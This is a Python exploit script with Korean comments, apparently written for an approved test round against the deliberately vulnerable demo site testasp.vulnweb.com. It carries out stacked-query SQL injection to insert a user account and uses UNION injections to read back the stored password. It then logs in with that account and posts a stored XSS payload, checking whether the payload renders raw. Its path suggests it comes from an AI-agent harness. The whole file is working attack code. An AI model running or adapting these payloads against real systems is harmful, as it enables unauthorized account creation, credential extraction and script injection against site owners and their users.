#!/usr/bin/env python3
"""Round 8 — 승인된 쓰기 실증 2건 (사용자 승인: 2026-09-28 Mattermost).

항목 1: stacked query 로 users 테이블에 계정 1행 INSERT → 정상 로그인으로 검증
항목 2: 그 계정으로 스레드에 답글 1건 작성 → stored XSS 실행 조건 확인
최소 흔적: users 1행 + 게시글 1건. 삭제/DROP/기존 행 변경 없음.
"""
import os
import subprocess
import urllib.parse

BASE = "http://testasp.vulnweb.com"
PROXY = ["-x", "http://127.0.0.1:8080",
         "--cacert", "/home/taeuk/.mitmproxy/mitmproxy-ca-cert.pem"]
J = "/home/taeuk/projects/llm-abliteration/hermes-harness/journal/web/testphp-vulnweb-test"
SCR = f"{J}/scratch/r8"
EVI = f"{J}/evidence/r8"
os.makedirs(SCR, exist_ok=True)
os.makedirs(EVI, exist_ok=True)

USER = "acu-r7 proof"
PASS = "P@ss-r7"
XSS = "<img src=x onerror=alert(document.domain)>"


def curl(url, data=None, jar=None, hdr=None, body=None, timeout=60):
    h = hdr or f"{SCR}/_h.tmp"
    b = body or f"{SCR}/_b.tmp"
    cmd = ["curl", "-s", "-S"] + PROXY + ["-m", str(timeout), "-D", h, "-o", b,
           "-w", "%{http_code} %{time_total}"]
    if jar:
        cmd += ["-b", jar, "-c", jar]
    if data is not None:
        cmd += ["-X", "POST", "--data", data]
    cmd.append(url)
    r = subprocess.run(cmd, capture_output=True, text=True)
    txt = lambda p: open(p, "rb").read().decode("latin-1") if os.path.exists(p) else ""
    return (r.stdout or "").strip(), txt(h), txt(b)


def save(name, text):
    open(f"{EVI}/{name}", "w", encoding="latin-1").write(text)


def union(select_list, tag):
    st = "q')>0) UNION ALL SELECT " + select_list + "--"
    url = f"{BASE}/Search.asp?tfSearch=" + urllib.parse.quote(st, safe="")
    info, _, body = curl(url, body=f"{SCR}/U_{tag}.html")
    save(f"r8_union_{tag}.html", body)
    i = body.find("posted by")
    poster = body[i + 9:body.find("</b>", i)].strip() if i >= 0 else "?"
    k = "posttitle'>"
    j = body.find(k)
    title = body[j + len(k):body.find("</div>", j)].strip() if j >= 0 else "?"
    print(f"    [{tag}] {info}  →  값={poster!r} (title={title!r})")
    return body


print("=" * 74)
print("1-a. 사전 기준선 — 계정이 아직 없음을 확인")
print("=" * 74)
info, _, _ = curl(f"{BASE}/Login.asp", body=f"{SCR}/pre_login.html")
j0 = f"{SCR}/pre.cookies"
info, hdr, body = curl(f"{BASE}/Login.asp", data="tfUName=" + urllib.parse.quote(USER) +
                       "&tfUPass=" + urllib.parse.quote(PASS), jar=j0,
                       body=f"{SCR}/pre_login_fail.html")
print(f"  로그인 시도(생성 전): {info}  → 'Invalid login' 표시: {'Invalid login' in body}")
union("1,CAST((SELECT COUNT(*) FROM users WHERE uname='acu-r7 proof') AS nvarchar(10))"
      ",'T','M',1,1,GETDATE(),'A','TT','FN'", "pre_count")

print()
print("=" * 74)
print("1-b. stacked query INSERT (승인된 요청 그대로 — 멱등 가드 포함)")
print("=" * 74)
payload = ("0;IF NOT EXISTS(SELECT 1 FROM users WHERE uname='acu-r7 proof') "
           "INSERT INTO users (uname,upass,email,realname,avatar) "
           "VALUES ('acu-r7 proof','P@ss-r7','r7@example.com','r7','')--")
url = f"{BASE}/showthread.asp?id=" + urllib.parse.quote(payload, safe="")
print(f"  GET {BASE}/showthread.asp?id={urllib.parse.quote(payload, safe='')}")
info, hdr, body = curl(url, body=f"{SCR}/stacked_insert.html")
print(f"  → {info}")
save("r8_stacked_insert_request.txt",
     f"URL: {url}\n\n=== RESPONSE HEADERS ===\n{hdr}\n\n=== BODY (first 3000) ===\n{body[:3000]}")

print()
print("=" * 74)
print("1-c. 검증 A — UNION 페이지 추출로 행 존재/값 확인")
print("=" * 74)
union("1,CAST((SELECT COUNT(*) FROM users WHERE uname='acu-r7 proof') AS nvarchar(10))"
      ",'T','M',1,1,GETDATE(),'A','TT','FN'", "post_count")
union("1,(CAST((SELECT upass FROM users WHERE uname='acu-r7 proof') AS nvarchar(100)))"
      ",'T','M',1,1,GETDATE(),'A','TT','FN'", "post_pass")
union("1,(CAST((SELECT realname FROM users WHERE uname='acu-r7 proof') AS nvarchar(100)))"
      ",'T','M',1,1,GETDATE(),'A','TT','FN'", "post_realname")

print()
print("=" * 74)
print("1-d. 검증 B — 만들어진 계정으로 정상 로그인 폼 로그인")
print("=" * 74)
JAR = f"{SCR}/newacct.cookies"
if os.path.exists(JAR):
    os.remove(JAR)
curl(f"{BASE}/Login.asp", jar=JAR)
info, hdr, body = curl(f"{BASE}/Login.asp",
                       data="tfUName=" + urllib.parse.quote(USER) + "&tfUPass=" + urllib.parse.quote(PASS),
                       jar=JAR, body=f"{SCR}/newacct_login.html")
loc = [l.strip() for l in hdr.splitlines() if l.lower().startswith(("http/", "location:"))]
print(f"  POST /Login.asp({USER}/{PASS}) → {info}")
for l in loc:
    print("    " + l)
save("r8_newacct_login_302.txt", hdr + "\n\n" + body[:2000])
info, _, body = curl(f"{BASE}/Default.asp", jar=JAR, body=f"{SCR}/newacct_default.html")
i = body.find("logout ")
print(f"  GET /Default.asp → {info}")
if i >= 0:
    print("    메뉴: " + repr(" ".join(body[i - 40:i + 90].split())))
save("r8_newacct_default.html", body)

print()
print("=" * 74)
print("2. stored XSS — 답글 1건 (승인됨). 세션=생성한 계정, id 는 주입하지 않음(id=0)")
print("=" * 74)
info, _, body = curl(f"{BASE}/showthread.asp?id=0", jar=JAR, body=f"{SCR}/thread_before.html")
print(f"  답글 폼 존재(작성 전): {'frmPostMessage' in body}  ({info})")
data = ("tfSubject=" + urllib.parse.quote("acuredteam-r8-xss-proof") +
        "&tfText=" + urllib.parse.quote(XSS) +
        "&tfSubject_sent=1")
info, hdr, body = curl(f"{BASE}/showthread.asp?id=0", data=data, jar=JAR,
                       body=f"{SCR}/xss_post_response.html")
print(f"  POST 답글 → {info}")
save("r8_xss_post_response.html", body)

info, _, body = curl(f"{BASE}/showthread.asp?id=0", jar=JAR, body=f"{SCR}/thread_after.html")
print(f"  GET 재방문 → {info}")
save("r8_thread_after_post.html", body)
hit = XSS in body
print(f"    페이로드가 게시글 본문에 raw 로 존재: {hit}")
if hit:
    i = body.find(XSS)
    print("    컨텍스트: " + repr(" ".join(body[i - 160:i + 60].split())))
    print("    HTML 인코딩(&lt;img) 여부:", "&lt;img src=x" in body)

print()
print("=" * 74)
print("3. 참고 — 현재 users/posts 행 수 (footprint 확인)")
print("=" * 74)
union("1,CAST((SELECT COUNT(*) FROM users) AS nvarchar(10)),"
      "CAST((SELECT COUNT(*) FROM posts) AS nvarchar(10)),"
      "CAST((SELECT COUNT(*) FROM threads) AS nvarchar(10)),1,1,GETDATE(),'A','TT','FN'", "counts")
print()
print("done")
